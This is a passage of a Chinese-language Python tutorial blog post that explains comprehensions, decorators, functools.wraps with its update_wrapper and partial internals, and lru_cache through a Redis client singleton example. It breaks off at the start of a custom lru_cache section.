<p>推导式表示一个表达式后面跟上一个<code>for</code> 语句即可, 并可以包含零个或多个 for 或 if 子句. 在这种情况下, 新容器中的元素是通过将每个 for 或 if 子句视为一个嵌套的代码块, 从左到右依次嵌套执行, 并在每次到达最内层的代码块时计算该表达式来生成的</p>
<p>最左侧 <code>for</code> 中的可迭代表达式是在<strong>外部作用域中直接求值</strong>的, 然后作为参数传递给后续的for / if语句.</p>
<p><strong>注意构造的是list, set, dic 取决于我们使用的是什么类型的推导式</strong></p>
<h5 data-id="heading-4">列表推导式</h5>
<p>列表显示是一个用方括号括起来的可能为空的表达式系列</p>
<pre><code class="hljs language-python" lang="python">list_display ::= <span class="hljs-string">"["</span> comprehension<span class="hljs-string">"]"</span>
</code></pre>
<p><code>[]</code>显示会产生一个新的列表对象, 其内容通过一系列表达式或一个推导式来指定.  <strong>当提供一个推导式时, 列表会根据推导式所产生的结果元素进行构建, 相当于把推导式生成的结果, 一个一个的放入列表对象中</strong></p>
<p>例如</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_comprehension</span>():
    <span class="hljs-string">"""列表推导式的测试"""</span>
    lst = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]
    squares = [i ** <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lst]
    <span class="hljs-built_in">print</span>(squares)
</code></pre>
<ul>
<li>嵌套的列表推导式</li>
</ul>
<p>列表推导式中的初始表达式可以是任何表达式, 甚至可以是另一个列表推导式</p>
<p>内部的列表推导式是在它之后的 for 的上下文中被求值的</p>
<p>初始表达式作为一个整体在后续的for子句中进行处理</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">example03</span>():
    matrix = [
        [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>],
        [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>],
        [<span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>],
    ]

    <span class="hljs-comment"># 我们尝试进行行列转换</span>
    res = []
    tmp = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
        <span class="hljs-keyword">for</span> it <span class="hljs-keyword">in</span> matrix:
            tmp.append(it[i])

        res.append(<span class="hljs-built_in">tuple</span>(tmp))
        tmp.clear()
    <span class="hljs-built_in">print</span>(res)
    res.clear()

    <span class="hljs-comment"># 通过列表推导式进行处理</span>
    <span class="hljs-comment"># 内部的列表推导式是在它之后的 for 的上下文中被求值的</span>
    res = [[item[i] <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> matrix] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
    <span class="hljs-built_in">print</span>(res)
</code></pre>
<blockquote>
<p>[!note]</p>
<p>这样的代码或许并不是特别容易阅读, 所以如果是多人开发, 考虑可读性, 我们可以使用zip函数</p>
</blockquote>
<pre><code class="hljs language-python" lang="python">res = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">zip</span>(*matrix))
</code></pre>
<h5 data-id="heading-5">集合推导式</h5>
<p>集合显示是用花括号标明的, 与字典显示的区别在于没有冒号分隔的键和值</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_comprehension</span>():
    <span class="hljs-string">"""集合推导式的测试"""</span>
    <span class="hljs-comment"># set会去重</span>
    s = {<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>}
    squares = [i ** <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]
    <span class="hljs-built_in">print</span>(squares)
</code></pre>
<h5 data-id="heading-6">字典推导式</h5>
<p>字典显示是一个用花括号括起来的可能为空的字典条目（键/值对）</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dict_comprehension</span>():
    <span class="hljs-string">"""字典推导式"""</span>
    d = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"alice"</span>, <span class="hljs-string">"age"</span>: <span class="hljs-number">28</span>}
    name_info = {k: v <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> d.items() <span class="hljs-keyword">if</span> k == <span class="hljs-string">"name"</span>}
    <span class="hljs-built_in">print</span>(name_info)

    <span class="hljs-comment"># 将两个列表合并为字典</span>
    keys = [<span class="hljs-string">'孙燕姿'</span>, <span class="hljs-string">'周杰伦'</span>, <span class="hljs-string">'方大同'</span>]
    values = [<span class="hljs-string">"我怀念的"</span>, <span class="hljs-string">"回到过去"</span>, <span class="hljs-string">"Love Song"</span>]
    songs = {name: song <span class="hljs-keyword">for</span> name, song <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(keys, values)}
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> songs.items():
        <span class="hljs-built_in">print</span>(item)
</code></pre>
<ul>
<li>二维字典推导式</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 二维字典推导式</span>
matrix = {
    row: {col: row * col <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>( <span class="hljs-number">1</span>, <span class="hljs-number">6</span>)}
    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)
}
<span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> matrix.items():
    <span class="hljs-built_in">print</span>(item)
    
<span class="hljs-string">"""
输出
(0, {1: 0, 2: 0, 3: 0, 4: 0, 5: 0})
(1, {1: 1, 2: 2, 3: 3, 4: 4, 5: 5})
(2, {1: 2, 2: 4, 3: 6, 4: 8, 5: 10})
"""</span>
</code></pre>
<p>初识求值的表达式总是会放在后续表达式中进行执行.</p>
<p>也常用这些处理</p>
<p>类别标签编码</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_dict</span>(<span class="hljs-params">src: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]</span>):
    <span class="hljs-string">"""key对齐的方式打印字典数据"""</span>
    max_len = <span class="hljs-built_in">max</span>(<span class="hljs-built_in">len</span>(k) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> src.keys())
    <span class="hljs-built_in">print</span>(max_len)

    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{k.rjust(max_len, <span class="hljs-string">' '</span>)}</span>: <span class="hljs-subst">{v}</span>"</span>)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">dict_comperhension_demo</span>():
    <span class="hljs-string">"""类别标签编码小案例"""</span>
    labels = [<span class="hljs-string">'cat'</span>, <span class="hljs-string">'dog'</span>, <span class="hljs-string">'bird'</span>, <span class="hljs-string">'cat'</span>, <span class="hljs-string">'bird'</span>]
    unique_labels = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">set</span>(labels))
    <span class="hljs-comment"># 获取label对应的编码, 这里以索引为例</span>
    label_to_id = {
        label: <span class="hljs-built_in">id</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span>, label <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(unique_labels)
    }
    print_dict(label_to_id)

    <span class="hljs-comment"># 对labels 进行encode</span>
    encoded = [label_to_id[item] <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> labels]
    <span class="hljs-built_in">print</span>(encoded)
    
<span class="hljs-string">"""
输出
bird: 0
 cat: 1
 dog: 2
[1, 2, 0, 1, 0]
"""</span>
</code></pre>
<h2 data-id="heading-7">装饰器</h2>
<p>在 python 的世界<strong>装饰器本质上是一个函数，它接收一个函数作为参数，并返回一个新的函数。</strong></p>
<p>而装饰器的核心作用：在不修改原函数代码的情况下，为函数添加额外的功能。</p>
<p>我们可以认为它是一种函数调用的语法糖，就像这样</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@decorator</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># 等价于</span>
func = decorator(func)
</code></pre>
<p>我们有时也可能看见这样的写法</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@decorator()  </span><span class="hljs-comment"># 注意，在装饰器后面加上了 ()</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># 等价于</span>
res = decorator()
func = res(func)
</code></pre>
<p>因为在Python中，函数可以像普通变量一样被传递和使用。这也是我们有时说函数是“一等公民”</p>
<h3 data-id="heading-8">快速入门</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_decorator</span>(<span class="hljs-params">func</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):  <span class="hljs-comment"># 接收任意参数</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"调用函数: <span class="hljs-subst">{func.__name__}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"参数: args=<span class="hljs-subst">{args}</span>, kwargs=<span class="hljs-subst">{kwargs}</span>"</span>)
        result = func(*args, **kwargs)  <span class="hljs-comment"># 调用原函数并获取返回值</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"返回值: <span class="hljs-subst">{result}</span>"</span>)
        <span class="hljs-keyword">return</span> result

    <span class="hljs-keyword">return</span> wrapper


<span class="hljs-meta">@my_decorator  </span><span class="hljs-comment"># 等同于 add = my_decorator(add)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>):
    <span class="hljs-keyword">return</span> x + y


result = add(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)
<span class="hljs-built_in">print</span>(add.__name__)  <span class="hljs-comment"># 输出：wrapper</span>
</code></pre>
<p>我们这里定义了一个装饰器，这个装饰器的功能就是在函数调用的时候，进行一些日志的输出，如果我们愿意，也可以将这里的日志输出改为对应的一些资源初始化或者清理的操作</p>
<p>但这里有个问题，我们被装饰函数的元数据发生了改变，也就是这行程序的输出有些不如预期，当然我们明白为何这样 <code>print(add.__name__)  # 输出：wrapper</code></p>
<p>而为了避免这个问题，我们可以使用一些 python 官方提供的函数工具</p>
<h3 data-id="heading-9">functools 的使用</h3>
<p>关于 functools 的更多说明，可以参考：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Ffunctools.html" target="_blank" title="https://docs.python.org/3/library/functools.html" ref="nofollow noopener noreferrer">docs.python.org/3/library/f…</a></p>
<p>装饰器的 PEP 的提出：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpeps.python.org%2Fpep-0318%2F" target="_blank" title="https://peps.python.org/pep-0318/" ref="nofollow noopener noreferrer">peps.python.org/pep-0318/</a></p>
<h5 data-id="heading-10">wraps</h5>
<h4 data-id="heading-11">快速入门</h4>
<p><code>functools.wraps</code>装饰器的使用</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> wraps


<span class="hljs-keyword">def</span> <span class="hljs-title function_">my_decorator</span>(<span class="hljs-params">func</span>):
<span class="hljs-meta">    @wraps(<span class="hljs-params">func</span>)  </span><span class="hljs-comment"># 这是涉及函数的多次嵌套：首先是 wraps(func) 进行调用，然后返回了一个函数对象，然后该函数对象对我们这里定义的 wrapper 函数进行装饰，所以wrapper最后变成了被装饰后的函数。</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"调用函数: <span class="hljs-subst">{func.__name__}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"参数: args=<span class="hljs-subst">{args}</span>, kwargs=<span class="hljs-subst">{kwargs}</span>"</span>)
        result = func(*args, **kwargs)  <span class="hljs-comment"># 调用原函数并获取返回值</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"返回值: <span class="hljs-subst">{result}</span>"</span>)
        <span class="hljs-keyword">return</span> result

    <span class="hljs-keyword">return</span> wrapper


<span class="hljs-meta">@my_decorator</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>):
    <span class="hljs-keyword">return</span> x + y


add(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
<span class="hljs-built_in">print</span>(add.__name__)  <span class="hljs-comment"># 输出 add</span>
</code></pre>
<p>为何需要该工具？</p>
<p>想象一些场景：</p>
<ul>
<li>调试场景，我们遇到一些错误日志，但是这些错误的堆栈跟踪显示的都是  wrapper，我们或许很难定位到具体的错误信息</li>
<li>python 中很多的模块为了简化代码的编写，我们可以默认使用函数的 doc 作为一些参数的默认赋值，使用了装饰器之后，我们将丢失该内容</li>
<li>在一些高级开发中，可能需要对我们的函数进行反射，这时候框架在获取获取函数签名时需要正确的元数据，但我们此时丢失了函数原本的元数据</li>
</ul>
<p><strong>所以比较 pythonic 的做法是始终在装饰器中使用 @wraps(func)</strong></p>
<h5 data-id="heading-12">探究</h5>
<p>functools.wraps 的源码分析</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">wraps</span>(<span class="hljs-params">wrapped,
          assigned = WRAPPER_ASSIGNMENTS,
          updated = WRAPPER_UPDATES</span>):
    <span class="hljs-string">"""Decorator factory to apply update_wrapper() to a wrapper function

       Returns a decorator that invokes update_wrapper() with the decorated
       function as the wrapper argument and the arguments to wraps() as the
       remaining arguments. Default arguments are as for update_wrapper().
       This is a convenience function to simplify applying partial() to
       update_wrapper().

    wraps 本质上是一个 装饰器工厂
    
    """</span>
    <span class="hljs-keyword">return</span> partial(update_wrapper, wrapped=wrapped,
                   assigned=assigned, updated=updated)



</code></pre>
<p>参数 说明</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 需要从原函数直接复制的属性</span>
WRAPPER_ASSIGNMENTS = (<span class="hljs-string">'__module__'</span>, <span class="hljs-string">'__name__'</span>, <span class="hljs-string">'__qualname__'</span>, <span class="hljs-string">'__doc__'</span>,
                       <span class="hljs-string">'__annotations__'</span>, <span class="hljs-string">'__type_params__'</span>)
<span class="hljs-comment"># 需要更新 / 合并 的属性</span>
WRAPPER_UPDATES = (<span class="hljs-string">'__dict__'</span>,)
</code></pre>
<p>更新函数 update_wrapper</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_wrapper</span>(<span class="hljs-params">wrapper,
                   wrapped,
                   assigned = WRAPPER_ASSIGNMENTS,
                   updated = WRAPPER_UPDATES</span>):
    <span class="hljs-string">"""Update a wrapper function to look like the wrapped function

       wrapper is the function to be updated
       wrapped is the original function
       assigned is a tuple naming the attributes assigned directly
       from the wrapped function to the wrapper function (defaults to
       functools.WRAPPER_ASSIGNMENTS)
       updated is a tuple naming the attributes of the wrapper that
       are updated with the corresponding attribute from the wrapped
       function (defaults to functools.WRAPPER_UPDATES)
    """</span>
    <span class="hljs-comment"># 遍历需要复制属性</span>
    <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> assigned:
        <span class="hljs-keyword">try</span>:
            value = <span class="hljs-built_in">getattr</span>(wrapped, attr)  <span class="hljs-comment"># 从原函数获取属性</span>
        <span class="hljs-keyword">except</span> AttributeError:
            <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 如果原函数该属性不存在，跳过</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">setattr</span>(wrapper, attr, value)  <span class="hljs-comment"># 设置到包装器函数</span>
            
    <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> updated:  <span class="hljs-comment"># 更新 __dict__</span>
        <span class="hljs-built_in">getattr</span>(wrapper, attr).update(<span class="hljs-built_in">getattr</span>(wrapped, attr, {}))

    <span class="hljs-comment"># 设置 __wrapped__ 属性（指向原函数），这样我们可以通过 func.__wrapped__ 访问原函数</span>
    wrapper.__wrapped__ = wrapped
   
    <span class="hljs-keyword">return</span> wrapper
</code></pre>
<p>到这里，我们大致可以分析 <code>functools.wraps</code>第一步的操作了</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@wraps(<span class="hljs-params">func</span>) </span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):
        ...

<span class="hljs-comment"># 获取wraps函数的返回值</span>
tmp = partial(update_wrapper, wrapped=func, assigned=assigned, updated=updated)

<span class="hljs-comment"># 通过该对象对我们自定义的wrapper进行装饰</span>
wrapper = tmp(wrapper)  <span class="hljs-comment"># 相当于调用 partial 类的 __call__ 方法</span>

<span class="hljs-comment"># partial 类的 __call__ 方法 会返回 update_wrapper 执行结果</span>
wrapper = update_wrapper(wrapper, func, WRAPPER_ASSIGNMENTS, WRAPPER_UPDATES)

<span class="hljs-comment"># 于是我们的wrapper的元数据就被指向到了 func(wrapped) 的内容中了</span>
</code></pre>
<p>partial 是什么？它是一个类，但是实现了 <code>__call__</code>所以可以当成函数，这里可以当成是一个 纯函数</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Purely functional, no descriptor behaviour</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">partial</span>:
    <span class="hljs-string">"""New function with partial application of the given arguments
    and keywords.
    """</span>

    <span class="hljs-comment"># 限制实例只能拥有这些属性，不使用默认的 __dict__</span>
    <span class="hljs-comment"># 如果不使用 __slots__，则每个实例都有一个 __dict__ 字典，占用更多内存</span>
    
    __slots__ = <span class="hljs-string">"func"</span>, <span class="hljs-string">"args"</span>, <span class="hljs-string">"keywords"</span>, <span class="hljs-string">"__dict__"</span>, <span class="hljs-string">"__weakref__"</span>

    <span class="hljs-comment"># func一定要注意，它是我们之前看到的update_wrapper函数对象，该对象负责对原有的add这样的函数的元数据进行维护</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, func, /, *args, **keywords</span>):
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">callable</span>(func):
            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">"the first argument must be callable"</span>)

        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(func, <span class="hljs-string">"func"</span>):  <span class="hljs-comment"># 如果 func 本身就是一个 partial 对象，合并它的参数</span>
            args = func.args + args
            keywords = {**func.keywords, **keywords}
            func = func.func

        self = <span class="hljs-built_in">super</span>(partial, cls).__new__(cls)

        self.func = func  <span class="hljs-comment"># 维护的原始函数</span>
        self.args = args  <span class="hljs-comment"># 维护的函数参数</span>
        self.keywords = keywords
        <span class="hljs-keyword">return</span> self

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, /, *args, **keywords</span>):
        keywords = {**self.keywords, **keywords}
        <span class="hljs-keyword">return</span> self.func(*self.args, *args, **keywords)  <span class="hljs-comment"># 调用的时候，展开参数</span>

    ...

    __class_getitem__ = <span class="hljs-built_in">classmethod</span>(GenericAlias)
</code></pre>
<p>关于 <code>__slots__</code>的功能</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 不使用 __slots__ 的普通类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NormalClass</span>:
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># 每个实例都有一个 __dict__ 字典，占用更多内存</span>
obj = NormalClass()
obj.a = <span class="hljs-number">1</span>
obj.b = <span class="hljs-number">2</span>  <span class="hljs-comment"># 可以随意添加属性</span>

<span class="hljs-comment"># 使用 __slots__ 的类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizedClass</span>:
    __slots__ = (<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>)

obj = OptimizedClass()
obj.a = <span class="hljs-number">1</span>
obj.b = <span class="hljs-number">2</span>
<span class="hljs-comment"># obj.c = 3  # 报错！无法添加未声明的属性</span>
</code></pre>
<p>关于<code>__new__</code>的功能</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> partial

<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b, c, d</span>):
    <span class="hljs-keyword">return</span> a + b + c + d

<span class="hljs-comment"># 链式 partial</span>
step1 = partial(add, <span class="hljs-number">1</span>)           <span class="hljs-comment"># 绑定 a=1</span>
step2 = partial(step1, <span class="hljs-number">2</span>)         <span class="hljs-comment"># 绑定 b=2</span>
step3 = partial(step2, <span class="hljs-number">3</span>)         <span class="hljs-comment"># 绑定 c=3</span>

<span class="hljs-comment"># 不做优化的话，会形成嵌套调用：</span>
<span class="hljs-comment"># step3(4) -&gt; step2(3, 4) -&gt; step1(2, 3, 4) -&gt; add(1, 2, 3, 4)</span>

<span class="hljs-comment"># 但通过 __new__ 的优化，直接展平为：</span>
<span class="hljs-comment"># step3.func = add (原始函数)</span>
<span class="hljs-comment"># step3.args = (1, 2, 3) (所有绑定的参数) 因为会判断当前的partial的参数是不是具有func属性，有了的话，直接参数合并，避免把原先的func进行赋值传递</span>
<span class="hljs-comment"># step3(4) -&gt; add(1, 2, 3, 4) 只调用一次！</span>
</code></pre>
<p>这里 python 的官方使用 partial 作为返回值类型，事实上我们可以不用返回该类型也可以实现</p>
<h5 data-id="heading-13">自定义 wraps</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_wraps</span>(<span class="hljs-params">func</span>):  <span class="hljs-comment"># 接受 wrapped</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator</span>(<span class="hljs-params">wrapper</span>):  <span class="hljs-comment"># 接受wrapper</span>
        <span class="hljs-string">"""篡改wrapper的元数据只想"""</span>
        wrapper.__name__ = func.__name__
        wrapper.__doc__ = func.__doc__
        wrapper.__module__ = func.__module__
        wrapper.__wrapped__ = func

        <span class="hljs-keyword">return</span> wrapper

    <span class="hljs-keyword">return</span> decorator


<span class="hljs-keyword">def</span> <span class="hljs-title function_">my_decorator</span>(<span class="hljs-params">func</span>):
<span class="hljs-meta">    @my_wraps(<span class="hljs-params">func</span>)</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"调用函数: <span class="hljs-subst">{func.__name__}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"参数: args=<span class="hljs-subst">{args}</span>, kwargs=<span class="hljs-subst">{kwargs}</span>"</span>)
        result = func(*args, **kwargs)  <span class="hljs-comment"># 调用原函数并获取返回值</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"返回值: <span class="hljs-subst">{result}</span>"</span>)
        <span class="hljs-keyword">return</span> result

    <span class="hljs-keyword">return</span> wrapper


<span class="hljs-meta">@my_decorator</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>):
    <span class="hljs-keyword">return</span> x + y


add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)
<span class="hljs-built_in">print</span>(add.__name__)  <span class="hljs-comment"># add</span>
</code></pre>
<p>我们这里 my_wraps 方法内部的 <code>decorator</code>就可以等同于之前<code>functools.wraps</code>的返回的 partial</p>
<p>可以发现我们自定义的程序可能比官方源码更加容易理解一下，但是这个程序却不如官方的程序那么通用，存在如下的一些缺陷</p>
<ol>
<li>参数的灵活</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 自定义的实现</span>
<span class="hljs-meta">@my_wraps(<span class="hljs-params">func</span>)  </span><span class="hljs-comment"># 固定复制 __name__, __doc__, __module__, __wrapped__</span>

<span class="hljs-comment"># 官方实现：根据需求设置</span>
<span class="hljs-meta">@wraps(<span class="hljs-params">func, assigned=(<span class="hljs-params"><span class="hljs-string">'__name__'</span>,</span>), updated=(<span class="hljs-params"/>)</span>)  </span><span class="hljs-comment"># 只复制 __name__</span>
</code></pre>
<p>不过这里也可以看出，其实 wraps 中的核心在于 update_wrapper 的功能，而不是 partial，但 partial 的好处在于它维护了 wrapped 的引用。</p>
<h5 data-id="heading-14">理解 wraps 的用处</h5>
<p>我们知道<code>functools.wraps</code>的底层通过参数控制要拷贝的初始化参数，那我们其实可以自己对它进行封装，改造出我们需要的装饰器，例如API路由装饰器</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 自定义wraps：只复制必要的元数据，忽略其他</span>
minimal_wraps = <span class="hljs-keyword">lambda</span> f: wraps(f, assigned=(<span class="hljs-string">'__name__'</span>,), updated=())

<span class="hljs-keyword">def</span> <span class="hljs-title function_">api_route</span>(<span class="hljs-params">path</span>):
    <span class="hljs-string">"""API路由装饰器 - 只需要保留函数名用于日志"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator</span>(<span class="hljs-params">func</span>):
<span class="hljs-meta">        @minimal_wraps(<span class="hljs-params">func</span>)</span>
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):
            <span class="hljs-keyword">return</span> func(*args, **kwargs)
        wrapper.route_path = path  <span class="hljs-comment"># 添加路由信息</span>
        <span class="hljs-keyword">return</span> wrapper
    <span class="hljs-keyword">return</span> decorator

<span class="hljs-meta">@api_route(<span class="hljs-params"><span class="hljs-string">'/users'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>():
    <span class="hljs-string">"""获取用户列表"""</span>
    <span class="hljs-keyword">return</span> [<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"Bob"</span>]
</code></pre>
<h4 data-id="heading-15">lru_cache</h4>
<h5 data-id="heading-16">快速入门</h5>
<p>实际开发中，除了 wraps 之外，我们还经常会使用 lru_cache 这个装饰器</p>
<p>什么是 LRU Cache？</p>
<p>LRU (Least Recently Used) 是一种缓存淘汰策略：</p>
<ul>
<li>缓存最近使用的结果</li>
<li>当缓存满时，删除最久未使用的项</li>
</ul>
<p>其次通过它我们还可以保证我们使用的是单例对象，例如</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> lru_cache

<span class="hljs-keyword">from</span> core.config <span class="hljs-keyword">import</span> get_settings

<span class="hljs-keyword">from</span> redis.asyncio <span class="hljs-keyword">import</span> Redis

logger = logging.getLogger(__name__)


<span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisClient</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self._settings = get_settings()
        self._client: Redis | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>

    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">if</span> self._client:
            logger.warning(<span class="hljs-string">"Redis client already initialized"</span>)
            <span class="hljs-keyword">return</span>
        <span class="hljs-keyword">try</span>:
            self._client = Redis(
                host=self._settings.redis_host,
                port=self._settings.redis_port,
                db=self._settings.redis_db,
                password=self._settings.redis_password)

            <span class="hljs-keyword">await</span> self._client.ping()
            logger.debug(<span class="hljs-string">"Redis client initialized"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logger.error(<span class="hljs-string">"Redis client initialization failed"</span>, e)
            <span class="hljs-keyword">raise</span> e

    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">shutdown</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">if</span> self._client:
            <span class="hljs-keyword">await</span> self._client.close()
            self._client = <span class="hljs-literal">None</span>
            logger.debug(<span class="hljs-string">"Redis client closed"</span>)

        <span class="hljs-comment"># clean cache</span>
        get_redis_client.cache_clear()

<span class="hljs-meta">    @property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">client</span>(<span class="hljs-params">self</span>) -&gt; Redis:
        <span class="hljs-keyword">if</span> self._client <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">"Redis client not initialized"</span>)
        <span class="hljs-keyword">return</span> self._client

<span class="hljs-meta">@lru_cache</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_redis_client</span>() -&gt; RedisClient:
    <span class="hljs-keyword">return</span> RedisClient()
</code></pre>
<p>这里每次调用 get_redis_client 都会从缓存中提供。</p>
<h5 data-id="heading-17">自定义 lru_cache</h5>
<p>空说有点抽象，我们看点实际的代码，看看 lru_cache 具体是怎么完成的</p>
<p>在看具体代码之前，我们先尝试自己定义一个 lru_cache</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> functools
<span class="hljs-keyword">import</span> inspect


